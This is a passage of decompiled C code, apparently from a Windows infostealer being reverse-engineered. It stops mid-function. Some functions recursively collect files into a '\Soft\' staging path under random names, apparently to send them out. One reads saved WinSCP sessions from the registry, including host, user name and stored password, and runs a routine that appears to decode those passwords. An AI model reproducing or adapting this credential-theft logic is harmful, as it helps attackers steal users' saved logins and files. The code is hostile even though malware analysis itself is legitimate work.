    uVar13 = CONCAT44(extraout_EDX_07,_DAT_003d9814);
  }
  _DAT_003d9814 = (undefined4)uVar13;
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present
            (local_18 ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar13 >> 0x20),uVar14);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall
FUN_0039dbd0(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  undefined *puVar4;
  ulong uVar5;
  uint uVar6;
  undefined4 extraout_EDX;
  undefined4 uVar7;
  undefined4 unaff_ESI;
  undefined8 uVar8;
  undefined uVar9;
  undefined local_954 [44];
  undefined local_928 [276];
  undefined local_814 [1000];
  undefined local_42c [264];
  undefined local_324 [264];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  (*_DAT_003d9374)(local_42c,&DAT_003d0aa8,param_2);
  uVar8 = (*_DAT_003d95e0)(local_42c,local_954);
  uVar7 = (undefined4)((ulonglong)uVar8 >> 0x20);
  iVar2 = (int)uVar8;
  uVar9 = (undefined)unaff_ESI;
  if (iVar2 != -1) {
    do {
      iVar3 = (*_DAT_003d9550)(local_928,&DAT_003d0ab0);
      if (iVar3 != 0) {
        iVar3 = (*_DAT_003d9550)(local_928,&DAT_003d0ab4);
        if (iVar3 != 0) {
          (*_DAT_003d9374)(local_324,"%s\\%s",param_2,local_928);
          iVar3 = (*_DAT_003d9550)(param_1,&DAT_003ce656);
          if (iVar3 == 0) {
            (*_DAT_003d9374)(local_21c,&DAT_003d0aec,local_928);
          }
          else {
            (*_DAT_003d9374)(local_21c,"%s\\%s",param_1,local_928);
          }
          iVar3 = (*_DAT_003d941c)(local_928,param_3);
          if (iVar3 != 0) {
            trim_string((undefined (*) [16])local_814,0,1000);
            (*_DAT_003d9520)(local_814,"\\Soft\\");
            (*_DAT_003d9520)(local_814,param_4);
            (*_DAT_003d9520)(local_814,&DAT_003ce7fc);
            (*_DAT_003d9520)(local_814,local_21c);
            trim_string((undefined (*) [16])local_114,0,0x104);
            (*_DAT_003d9520)(local_114,DAT_003d9098);
            puVar4 = (undefined *)_malloc(0x1a);
            *puVar4 = 0;
            uVar5 = (*_DAT_003d958c)();
            FUN_003b27b4(uVar5);
            iVar3 = 0x1a;
            do {
              uVar6 = FUN_003b27c6();
              (*_DAT_003d9374)(puVar4,&DAT_003d1ad4,puVar4,(int)uVar6 % 10);
              iVar3 = iVar3 + -1;
            } while (iVar3 != 0);
            puVar4[0x1a] = 0;
            (*_DAT_003d9520)(local_114,puVar4);
            (*_DAT_003d93c8)(local_324,local_114,1);
            piVar1 = *(int **)((int)this + 0x20);
            if (piVar1 == (int *)0x0) {
              _DAT_003d9814 = 0x10000;
            }
            else {
              if (*piVar1 == 2) {
                _DAT_003d9814 = FUN_003ad750((char **)piVar1[1],(int)local_114,local_814,0,2);
              }
              else {
                _DAT_003d9814 = 0x80000;
              }
            }
            (*_DAT_003d9424)(local_114);
          }
          FUN_0039dbd0(this,local_21c,local_324,param_3,param_4);
        }
      }
      iVar3 = (*_DAT_003d9438)(iVar2,local_954);
      uVar9 = (undefined)unaff_ESI;
    } while (iVar3 != 0);
    (*_DAT_003d93a8)(iVar2);
    uVar7 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,uVar9);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039deb0(rsize_t *param_1,int **param_2,char **param_3)

{
  rsize_t _SizeInBytes;
  char *pcVar1;
  int iVar2;
  undefined4 uVar3;
  int **ppiVar4;
  undefined4 *_Src;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined unaff_BL;
  int **in_FS_OFFSET;
  undefined8 uVar5;
  void *local_60 [7];
  void *local_44 [7];
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined local_18;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3228;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_28 = 0x33323130;
  local_24 = 0x37363534;
  local_20 = 0x42413938;
  local_1c = 0x46454443;
  local_18 = 0;
  uVar5 = (*_DAT_003d9418)(param_2,local_14);
  uVar3 = (undefined4)((ulonglong)uVar5 >> 0x20);
  if (((0 < (int)uVar5) &&
      (pcVar1 = _strchr((char *)&local_28,(int)*(char *)param_2), uVar3 = extraout_EDX,
      pcVar1 != (char *)0x0)) &&
     (pcVar1 = _strchr((char *)&local_28,(int)*(char *)((int)param_2 + 1)), uVar3 = extraout_EDX_00,
     pcVar1 != (char *)0x0)) {
    iVar2 = (*_DAT_003d9418)(param_2);
    _SizeInBytes = iVar2 - 1;
    *param_1 = _SizeInBytes;
    uVar3 = (*_DAT_003d957c)(8,_SizeInBytes);
    uVar5 = (*_DAT_003d9504)(uVar3);
    uVar3 = (undefined4)((ulonglong)uVar5 >> 0x20);
    *param_3 = (char *)uVar5;
    if ((char *)uVar5 != (char *)0x0) {
      ppiVar4 = (int **)FUN_00389300(local_44,param_2);
      local_8 = 0;
      _Src = (undefined4 *)FUN_00395990((int *)0x2,ppiVar4,(int *)0xffffffff);
      if (0xf < (uint)_Src[5]) {
        _Src = (undefined4 *)*_Src;
      }
      _strcpy_s(*param_3,_SizeInBytes,(char *)_Src);
      FUN_00389360(local_60);
      FUN_00389360(local_44);
      uVar3 = extraout_EDX_01;
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,unaff_BL);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039e000(char *param_1,int **param_2,undefined *param_3,int **param_4)

{
  int **_SizeInBytes;
  char *pcVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  int **ppiVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  rsize_t _SizeInBytes_00;
  undefined4 *_Src;
  size_t sVar9;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined4 extraout_EDX_10;
  undefined4 extraout_EDX_11;
  undefined4 extraout_EDX_12;
  undefined4 extraout_EDX_13;
  undefined4 unaff_EDI;
  int **in_FS_OFFSET;
  undefined uVar10;
  int local_a0;
  int local_94;
  int **local_8c;
  char *local_88;
  void *local_84 [4];
  undefined4 local_74;
  uint local_70;
  void *local_68 [4];
  undefined4 local_58;
  uint local_54;
  int *local_4c [4];
  int *local_3c;
  uint local_38;
  void *local_30 [4];
  int *local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3668;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_88 = (char *)0x0;
  local_8c = (int **)0x0;
  local_38 = 0xf;
  local_3c = (int *)0x0;
  local_4c[0] = (int *)((uint)local_4c[0] & 0xffffff00);
  local_1c = 0xf;
  local_20 = (int *)0x0;
  local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
  local_8 = 1;
  local_14 = uVar2;
  iVar3 = FUN_0039deb0((rsize_t *)&local_8c,param_2,&local_88);
  uVar4 = (*_DAT_003d957c)(8,local_8c,uVar2);
  ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
  uVar10 = (undefined)unaff_EDI;
  if (ppiVar5 == (int **)0x0) {
LAB_0039e0ac:
    if (local_88 != (char *)0x0) {
      uVar4 = (*_DAT_003d957c)(0,local_88);
      (*_DAT_003d95a8)(uVar4);
    }
    *(undefined4 *)(param_3 + 0x14) = 0xf;
    *(undefined4 *)(param_3 + 0x10) = 0;
    *param_3 = 0;
    piVar6 = (int *)_strlen("");
    FUN_003894c0(param_3,(int **)&DAT_003ce656,piVar6);
    uVar4 = extraout_EDX;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
      uVar4 = extraout_EDX_00;
    }
  }
  else {
    _strcpy_s((char *)ppiVar5,(rsize_t)local_8c,local_88);
    if (local_88 != (char *)0x0) {
      uVar4 = (*_DAT_003d957c)(0,local_88);
      (*_DAT_003d95a8)(uVar4);
      local_88 = (char *)0x0;
    }
    local_a0 = iVar3;
    if (iVar3 == 0xff) {
      FUN_0039deb0((rsize_t *)&local_8c,ppiVar5,&local_88);
      uVar4 = (*_DAT_003d957c)(0,ppiVar5);
      (*_DAT_003d95a8)(uVar4);
      uVar4 = (*_DAT_003d957c)(8,local_8c);
      ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
      uVar10 = (undefined)unaff_EDI;
      if (ppiVar5 != (int **)0x0) {
        _strcpy_s((char *)ppiVar5,(rsize_t)local_8c,local_88);
        if (local_88 != (char *)0x0) {
          uVar4 = (*_DAT_003d957c)(0,local_88);
          (*_DAT_003d95a8)(uVar4);
          local_88 = (char *)0x0;
        }
        local_a0 = FUN_0039deb0((rsize_t *)&local_8c,ppiVar5,&local_88);
        uVar4 = (*_DAT_003d957c)(0,ppiVar5);
        (*_DAT_003d95a8)(uVar4);
        uVar4 = (*_DAT_003d957c)(8,local_8c);
        ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
        uVar10 = (undefined)unaff_EDI;
        if (ppiVar5 != (int **)0x0) {
          _strcpy_s((char *)ppiVar5,(rsize_t)local_8c,local_88);
          if (local_88 != (char *)0x0) {
            uVar4 = (*_DAT_003d957c)(0,local_88);
            (*_DAT_003d95a8)(uVar4);
            local_88 = (char *)0x0;
          }
          goto LAB_0039e29f;
        }
        if (local_88 != (char *)0x0) goto LAB_0039e230;
LAB_0039e23e:
        FUN_00389300(param_3,(int **)&DAT_003ce656);
        FUN_00389360(local_30);
        FUN_00389360(local_4c);
        uVar4 = extraout_EDX_02;
        goto LAB_0039e6f3;
      }
      goto LAB_0039e0ac;
    }
LAB_0039e29f:
    iVar7 = FUN_0039deb0((rsize_t *)&local_8c,ppiVar5,&local_88);
    uVar4 = (*_DAT_003d957c)(0,ppiVar5);
    (*_DAT_003d95a8)(uVar4);
    uVar4 = (*_DAT_003d957c)(8,local_8c);
    ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
    uVar10 = (undefined)unaff_EDI;
    if (ppiVar5 == (int **)0x0) {
      if (local_88 != (char *)0x0) {
        uVar4 = (*_DAT_003d957c)(0,local_88);
        (*_DAT_003d95a8)(uVar4);
      }
      *(undefined4 *)(param_3 + 0x14) = 0xf;
      *(undefined4 *)(param_3 + 0x10) = 0;
      *param_3 = 0;
      piVar6 = (int *)_strlen("");
      FUN_003894c0(param_3,(int **)&DAT_003ce656,piVar6);
      uVar4 = extraout_EDX_03;
      if (0xf < local_1c) {
        FUN_003aee4b(local_30[0]);
        uVar4 = extraout_EDX_04;
      }
      local_1c = 0xf;
      local_20 = (int *)0x0;
      local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
      if (0xf < local_38) {
        FUN_003aee4b(local_4c[0]);
        uVar4 = extraout_EDX_05;
      }
      goto LAB_0039e6f3;
    }
    _strcpy_s((char *)ppiVar5,(rsize_t)local_8c,local_88);
    if (local_88 != (char *)0x0) {
      uVar4 = (*_DAT_003d957c)(0,local_88);
      (*_DAT_003d95a8)(uVar4);
    }
    iVar8 = (*_DAT_003d9418)(ppiVar5);
    _SizeInBytes_00 = iVar8 + iVar7 * -2 + 1;
    uVar4 = (*_DAT_003d957c)(8,_SizeInBytes_00);
    local_88 = (char *)(*_DAT_003d9504)(uVar4);
    uVar10 = (undefined)unaff_EDI;
    if (local_88 != (char *)0x0) {
      local_8c = (int **)FUN_00389300(local_84,ppiVar5);
      local_8 = CONCAT31(local_8._1_3_,2);
      piVar6 = (int *)(*_DAT_003d9418)(ppiVar5);
      _Src = (undefined4 *)FUN_00395990((int *)(iVar7 * 2),local_8c,piVar6);
      pcVar1 = local_88;
      if (0xf < (uint)_Src[5]) {
        _Src = (undefined4 *)*_Src;
      }
      _strcpy_s(local_88,_SizeInBytes_00,(char *)_Src);
      if (0xf < local_54) {
        FUN_003aee4b(local_68[0]);
      }
      local_8 = CONCAT31(local_8._1_3_,1);
      local_54 = 0xf;
      local_58 = 0;
      local_68[0] = (void *)((uint)local_68[0] & 0xffffff00);
      if (0xf < local_70) {
        FUN_003aee4b(local_84[0]);
      }
      local_70 = 0xf;
      local_74 = 0;
      local_84[0] = (void *)((uint)local_84[0] & 0xffffff00);
      uVar4 = (*_DAT_003d957c)(0,ppiVar5);
      (*_DAT_003d95a8)(uVar4);
      iVar7 = (*_DAT_003d9418)(pcVar1);
      local_8c = (int **)(iVar7 + 1);
      uVar4 = (*_DAT_003d957c)(8,local_8c);
      ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
      uVar10 = (undefined)unaff_EDI;
      if (ppiVar5 != (int **)0x0) {
        _strcpy_s((char *)ppiVar5,(rsize_t)local_8c,local_88);
        uVar4 = (*_DAT_003d957c)(0,local_88);
        (*_DAT_003d95a8)(uVar4);
        uVar10 = (undefined)unaff_EDI;
        local_88 = (char *)0x0;
        local_94 = 0;
        if (0 < local_a0) {
          do {
            FUN_0039deb0((rsize_t *)&local_8c,ppiVar5,&local_88);
            uVar4 = (*_DAT_003d957c)(0,ppiVar5);
            (*_DAT_003d95a8)(uVar4);
            _SizeInBytes = local_8c;
            uVar4 = (*_DAT_003d957c)(8,local_8c);
            ppiVar5 = (int **)(*_DAT_003d9504)(uVar4);
            pcVar1 = local_88;
            uVar10 = (undefined)unaff_EDI;
            if (ppiVar5 == (int **)0x0) {
              if (local_88 != (char *)0x0) {
                uVar4 = (*_DAT_003d957c)(0,local_88);
                (*_DAT_003d95a8)(uVar4);
              }
              *(undefined4 *)(param_3 + 0x14) = 0xf;
              *(undefined4 *)(param_3 + 0x10) = 0;
              *param_3 = 0;
              piVar6 = (int *)_strlen("");
              FUN_003894c0(param_3,(int **)&DAT_003ce656,piVar6);
              uVar4 = extraout_EDX_11;
              if (0xf < local_1c) {
                FUN_003aee4b(local_30[0]);
                uVar4 = extraout_EDX_12;
              }
              local_1c = 0xf;
              local_20 = (int *)0x0;
              local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
              if (0xf < local_38) {
                FUN_003aee4b(local_4c[0]);
                uVar4 = extraout_EDX_13;
              }
              goto LAB_0039e6f3;
            }
            _strcpy_s((char *)ppiVar5,(rsize_t)_SizeInBytes,local_88);
            if (pcVar1 != (char *)0x0) {
              uVar4 = (*_DAT_003d957c)(0,pcVar1);
              (*_DAT_003d95a8)(uVar4);
              local_88 = (char *)0x0;
            }
            FUN_003a17b0();
            uVar10 = (undefined)unaff_EDI;
            local_94 = local_94 + 1;
          } while (local_94 < local_a0);
        }
        if (iVar3 == 0xff) {
          local_54 = 0xf;
          local_58 = 0;
          local_68[0] = (void *)((uint)local_68[0] & 0xffffff00);
          piVar6 = (int *)_strlen((char *)param_4);
          FUN_003894c0(local_68,param_4,piVar6);
          local_8._0_1_ = 3;
          FUN_003893d0();
          local_8._0_1_ = 1;
          if (0xf < local_54) {
            FUN_003aee4b(local_68[0]);
          }
          sVar9 = _strlen(param_1);
          FUN_00395d90(local_30,sVar9);
          FUN_00395990(local_20,local_4c,local_3c);
          local_8._0_1_ = 4;
          FUN_003893d0();
          local_8 = CONCAT31(local_8._1_3_,1);
          if (0xf < local_70) {
            FUN_003aee4b(local_84[0]);
          }
          local_70 = 0xf;
          local_74 = 0;
          local_84[0] = (void *)((uint)local_84[0] & 0xffffff00);
        }
        uVar4 = (*_DAT_003d957c)(0,ppiVar5);
        (*_DAT_003d95a8)(uVar4);
        *(undefined4 *)(param_3 + 0x14) = 0xf;
        *(undefined4 *)(param_3 + 0x10) = 0;
        *param_3 = 0;
        FUN_003893d0();
        uVar4 = extraout_EDX_08;
        if (0xf < local_1c) {
          FUN_003aee4b(local_30[0]);
          uVar4 = extraout_EDX_09;
        }
        local_1c = 0xf;
        local_20 = (int *)0x0;
        local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
        if (0xf < local_38) {
          FUN_003aee4b(local_4c[0]);
          uVar4 = extraout_EDX_10;
        }
        goto LAB_0039e6f3;
      }
LAB_0039e230:
      uVar4 = (*_DAT_003d957c)(0,local_88);
      (*_DAT_003d95a8)(uVar4);
      goto LAB_0039e23e;
    }
    FUN_00389300(param_3,(int **)&DAT_003ce656);
    uVar4 = extraout_EDX_06;
    if (0xf < local_1c) {
      FUN_003aee4b(local_30[0]);
      uVar4 = extraout_EDX_07;
    }
  }
  local_1c = 0xf;
  local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
  local_20 = (int *)0x0;
  if (0xf < local_38) {
    FUN_003aee4b(local_4c[0]);
    uVar4 = extraout_EDX_01;
  }
LAB_0039e6f3:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar4,uVar10);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0039e790(undefined4 param_1)

{
  int **ppiVar1;
  int *piVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *****pppppuVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar7;
  undefined4 extraout_EDX_01;
  int **in_FS_OFFSET;
  undefined8 uVar8;
  undefined uVar9;
  undefined local_df4 [4];
  undefined4 local_df0;
  undefined local_dec [4];
  undefined4 local_de8;
  undefined4 local_de4;
  undefined4 local_de0;
  int local_ddc;
  undefined4 local_dd8;
  undefined4 *local_dd4;
  undefined4 local_dd0;
  char local_dc9;
  int local_dc8;
  void *local_dc4 [4];
  undefined4 local_db4;
  uint local_db0;
  void *local_da8;
  undefined4 local_d98;
  uint local_d94;
  void *local_d8c [4];
  undefined4 local_d7c;
  uint local_d78;
  void *local_d70 [4];
  undefined4 local_d60;
  uint local_d5c;
  void *local_d54;
  undefined4 local_d44;
  uint local_d40;
  undefined4 *****local_d38 [4];
  undefined4 local_d28;
  uint local_d24;
  undefined4 local_d1c;
  char local_91c;
  undefined local_91b [1023];
  undefined4 local_51c;
  undefined local_11c;
  undefined local_11b [263];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  int *piVar10;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3fad;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_ddc = 0;
  local_11c = 0;
  local_dd8 = param_1;
  trim_string((undefined (*) [16])local_11b,0,0x103);
  local_dd0 = 0x104;
  local_d1c._0_1_ = 0;
  trim_string((undefined (*) [16])((int)&local_d1c + 1),0,0x3ff);
  local_91c = '\0';
  trim_string((undefined (*) [16])local_91b,0,0x3ff);
  local_51c._0_1_ = 0;
  trim_string((undefined (*) [16])((int)&local_51c + 1),0,0x3ff);
  trim_string((undefined (*) [16])&local_d1c,0,0x400);
  trim_string((undefined (*) [16])&local_91c,0,0x400);
  trim_string((undefined (*) [16])&local_51c,0,0x400);
  piVar10 = &local_dc8;
  local_de8 = 0x400;
  local_de4 = 0x400;
  local_de0 = 0x400;
  uVar8 = (*_DAT_003d95ac)(0x80000001,L"Software\\Martin Prikryl\\WinSCP 2\\Configuration",0,1);
  ppiVar1 = DAT_003d90c0;
  uVar7 = (undefined4)((ulonglong)uVar8 >> 0x20);
  uVar9 = SUB41(piVar10,0);
  if ((int)uVar8 != 0) goto LAB_0039ee12;
  local_d78 = 0xf;
  local_d7c = 0;
  local_d8c[0] = (void *)((uint)local_d8c[0] & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d90c0);
  FUN_003894c0(local_d8c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d929c;
  local_8 = 0;
  local_d5c = 0xf;
  local_d60 = 0;
  local_d70[0] = (void *)((uint)local_d70[0] & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d929c);
  FUN_003894c0(local_d70,ppiVar1,piVar2);
  local_8._0_1_ = 1;
  local_dd4 = (undefined4 *)FUN_003a58e0();
  local_8._0_1_ = 2;
  puVar3 = (undefined4 *)FUN_003a58e0();
  local_8 = CONCAT31(local_8._1_3_,3);
  puVar5 = local_dd4;
  if (7 < (uint)local_dd4[5]) {
    puVar5 = (undefined4 *)*local_dd4;
  }
  if (7 < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  iVar4 = (*_DAT_003d9368)(local_dc8,puVar3,puVar5,0x10,0,local_dec,local_df4);
  local_dc9 = iVar4 != 0;
  if (7 < local_d94) {
    FUN_003aee4b(local_da8);
  }
  local_d94 = 7;
  local_d98 = 0;
  local_da8 = (void *)((uint)local_da8 & 0xffff0000);
  if (7 < local_d40) {
    FUN_003aee4b(local_d54);
  }
  local_d40 = 7;
  local_d44 = 0;
  local_d54 = (void *)((uint)local_d54 & 0xffff0000);
  if (0xf < local_d5c) {
    FUN_003aee4b(local_d70[0]);
  }
  local_8 = 0xffffffff;
  local_d5c = 0xf;
  local_d60 = 0;
  local_d70[0] = (void *)((uint)local_d70[0] & 0xffffff00);
  if (0xf < local_d78) {
    FUN_003aee4b(local_d8c[0]);
  }
  local_d78 = 0xf;
  local_d7c = 0;
  local_d8c[0] = (void *)((uint)local_d8c[0] & 0xffffff00);
  if (local_dc9 == '\0') {
LAB_0039ea76:
    if (local_dc8 != 0) {
      (*_DAT_003d94d0)(local_dc8);
      local_dc8 = 0;
    }
  }
  else {
    if (local_dc8 != 0) {
      (*_DAT_003d94d0)(local_dc8);
      local_dc8 = 0;
      goto LAB_0039ea76;
    }
  }
  uVar8 = (*_DAT_003d95ac)(0x80000001,L"Software\\Martin Prikryl\\WinSCP 2\\Sessions",0,9,&local_dc8
                          );
  uVar7 = (undefined4)((ulonglong)uVar8 >> 0x20);
  uVar9 = SUB41(piVar10,0);
  if ((int)uVar8 == 0) {
    uVar8 = (*_DAT_003d9574)(local_dc8,0,&local_11c,&local_dd0,0,0,0,0);
    uVar7 = (undefined4)((ulonglong)uVar8 >> 0x20);
    uVar9 = SUB41(piVar10,0);
    if ((int)uVar8 == 0) {
      do {
        (*_DAT_003d9520)(param_1,&DAT_003ce668);
        (*_DAT_003d9520)(param_1,DAT_003d8c3c);
        (*_DAT_003d9520)(param_1,&DAT_003ce668);
        (*_DAT_003d9520)(param_1,DAT_003d91e0);
        (*_DAT_003d9408)(local_dc8,&local_11c,DAT_003d8b9c,2,0,&local_d1c,&local_de8);
        (*_DAT_003d9520)(param_1,&local_d1c);
        local_dd4 = (undefined4 *)&DAT_00000004;
        iVar4 = (*_DAT_003d9408)(local_dc8,&local_11c,DAT_003d8d00,0xffff,0,&local_df0,&local_dd4);
        if (iVar4 == 0) {
          puVar5 = (undefined4 *)FUN_003a5670(local_df0);
          local_8 = 4;
          if (0xf < (uint)puVar5[5]) {
            puVar5 = (undefined4 *)*puVar5;
          }
          (*_DAT_003d9520)(param_1,puVar5);
          local_8 = 0xffffffff;
          if (0xf < local_d40) {
            FUN_003aee4b(local_d54);
          }
          local_d40 = 0xf;
          local_d44 = 0;
          local_d54 = (void *)((uint)local_d54 & 0xffffff00);
        }
        else {
          (*_DAT_003d9520)(param_1,&DAT_003d119c);
        }
        (*_DAT_003d9520)(param_1,&DAT_003ce668);
        (*_DAT_003d9520)(param_1,DAT_003d8c9c);
        (*_DAT_003d9408)(local_dc8,&local_11c,DAT_003d9264,2,0,&local_91c,&local_de4);
        (*_DAT_003d9520)(param_1,&local_91c);
        local_d24 = 0xf;
        local_d28 = 0;
        local_d38[0] = (undefined4 *****)((uint)local_d38[0] & 0xffffff00);
        local_8 = 5;
        (*_DAT_003d9408)(local_dc8,&local_11c,DAT_003d8e2c,2,0,&local_51c,&local_de0);
        (*_DAT_003d9520)(param_1,&DAT_003ce668);
        (*_DAT_003d9520)(param_1,DAT_003d919c);
        iVar4 = (*_DAT_003d9550)(&local_51c,&DAT_003ce656);
        if (iVar4 != 0) {
          FUN_0039e000(&local_91c,(int **)&local_51c,(undefined *)local_dc4,(int **)&local_d1c);
          local_8._0_1_ = 6;
          FUN_003893d0();
          local_8 = CONCAT31(local_8._1_3_,5);
          if (0xf < local_db0) {
            FUN_003aee4b(local_dc4[0]);
          }
          local_db0 = 0xf;
          local_db4 = 0;
          local_dc4[0] = (void *)((uint)local_dc4[0] & 0xffffff00);
          pppppuVar6 = local_d38[0];
          if (local_d24 < 0x10) {
            pppppuVar6 = local_d38;
          }
          (*_DAT_003d9520)(local_dd8,pppppuVar6);
          param_1 = local_dd8;
        }
        (*_DAT_003d9520)(param_1,&DAT_003d0c34);
        local_ddc = local_ddc + 1;
        local_dd0 = 0x104;
        iVar4 = (*_DAT_003d9574)(local_dc8,local_ddc,&local_11c,&local_dd0,0,0,0,0);
        trim_string((undefined (*) [16])&local_91c,0,0);
        trim_string((undefined (*) [16])local_d38,0,0);
        trim_string((undefined (*) [16])&local_51c,0,0);
        local_8 = 0xffffffff;
        uVar7 = extraout_EDX;
        if (0xf < local_d24) {
          FUN_003aee4b(local_d38[0]);
          uVar7 = extraout_EDX_00;
        }
        uVar9 = SUB41(piVar10,0);
        local_d24 = 0xf;
        local_d28 = 0;
        local_d38[0] = (undefined4 *****)((uint)local_d38[0] & 0xffffff00);
      } while (iVar4 != 0x103);
    }
    if (local_dc8 != 0) {
      (*_DAT_003d94d0)(local_dc8);
      uVar7 = extraout_EDX_01;
    }
  }
LAB_0039ee12:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar7,uVar9);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_0039ee40(undefined4 param_1,int param_2,undefined4 param_3,undefined4 param_4,int param_5,
            int param_6)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  undefined *puVar4;
  ulong uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  undefined4 extraout_EDX;
  undefined4 unaff_EDI;
  undefined8 uVar9;
  undefined uVar10;
  uint local_58c;
  uint local_588;
  undefined4 local_580;
  undefined4 local_57c;
  undefined4 local_578;
  int local_574;
  int local_570;
  undefined local_56c [44];
  undefined local_540 [276];
  undefined local_42c [264];
  undefined local_324 [264];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_578 = param_3;
  local_57c = param_4;
  local_580 = param_1;
  local_570 = param_2;
  (*_DAT_003d9374)(local_42c,&DAT_003d0aa8,param_3);
  uVar9 = (*_DAT_003d95e0)(local_42c,local_56c);
  local_574 = (int)uVar9;
  uVar10 = (undefined)unaff_EDI;
  if (local_574 != -1) {
    do {
      *(int *)(param_2 + 0x1c) = *(int *)(param_2 + 0x1c) + 1;
      iVar2 = (*_DAT_003d9550)(local_540,&DAT_003d0ab0);
      if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_540,&DAT_003d0ab4), iVar2 != 0)) {
        trim_string((undefined (*) [16])local_324,0,0x104);
        trim_string((undefined (*) [16])local_114,0,0x104);
        (*_DAT_003d9520)(local_324,param_3);
        (*_DAT_003d9520)(local_324,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_324,local_540);
        (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
        uVar3 = DAT_003d924c;
        if (param_5 != 0) {
          uVar3 = DAT_003d8b54;
        }
        (*_DAT_003d9520)(local_114,uVar3);
        (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_114);
        (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_114,local_57c);
        (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_114,local_580);
        if (param_6 == 1) {
          (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
          uVar3 = DAT_003d9088;
LAB_0039f044:
          (*_DAT_003d9520)(local_114,uVar3);
        }
        else {
          if (param_6 == 2) {
            (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
            uVar3 = DAT_003d8ee8;
            goto LAB_0039f044;
          }
          if (param_6 == 3) {
            (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
            uVar3 = DAT_003d8b98;
            goto LAB_0039f044;
          }
        }
        (*_DAT_003d9520)(local_114,&DAT_003ce7fc);
        (*_DAT_003d9520)(local_114,local_540);
        trim_string((undefined (*) [16])local_21c,0,0x104);
        (*_DAT_003d9520)(local_21c,DAT_003d9098);
        puVar4 = (undefined *)_malloc(0x1a);
        *puVar4 = 0;
        uVar5 = (*_DAT_003d958c)();
        FUN_003b27b4(uVar5);
        iVar2 = 0x1a;
        do {
          uVar6 = FUN_003b27c6();
          (*_DAT_003d9374)(puVar4,&DAT_003d1ad4,puVar4,(int)uVar6 % 10);
          iVar2 = iVar2 + -1;
        } while (iVar2 != 0);
        puVar4[0x1a] = 0;
        (*_DAT_003d9520)(local_21c,puVar4);
